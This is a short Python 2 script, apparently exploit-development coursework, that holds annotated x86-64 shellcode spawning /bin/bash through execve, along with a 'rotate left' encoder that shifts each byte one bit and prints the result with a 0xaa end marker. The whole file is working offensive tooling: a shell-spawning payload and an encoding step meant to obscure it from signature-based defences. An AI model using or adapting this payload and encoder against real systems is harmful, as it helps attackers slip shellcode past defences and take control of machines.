#!/usr/bin/python
## Author: Bobby Cooke
## Rotate Left Encoder
shellcode  = "\x48\x31\xf6"     # xor rsi, rsi
shellcode += "\x48\xf7\xe6"     # mul rsi          ; rdx&rax= 0x0
shellcode += "\x48\x31\xff"     # xor rdi, rdi
shellcode += "\x57"             # push rdi
shellcode += "\x48\x83\xc2\x68" # add rdx, 0x68
shellcode += "\x52"             # push rdx
shellcode += "\x48\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73" # movabs rdx, 0x7361622f6e69622f
shellcode += "\x52"             # push rdx
shellcode += "\x48\x31\xd2"     # xor rdx, rdx
shellcode += "\x48\x89\xe7"     # mov rdi, rsp ; rdi = Pointer -> "/bin/bash"0x00
shellcode += "\xb0\x3b"         # mov al, 0x3b ; execve syscall number
shellcode += "\x0f\x05";        # syscall  ; call execve("/bin/bash", NULL, NULL)

encoded = ""
for x in bytearray(shellcode) :
    if x > 127:
        x = x - 128             # Remove the left-most bit
        x = x << 1              # Shift to the left 1
        x += 1                  # Add 1, to complete the rotate
        encoded += '0x'
        encoded += '%02x,' %x  # Add the rotated left hex to string
    else:
        encoded += '0x'        # No leftmost bit, just rotate
        encoded += '%02x,' %(x << 1)
print encoded+"0xaa"
print 'Len: %d' % len(bytearray(shellcode))

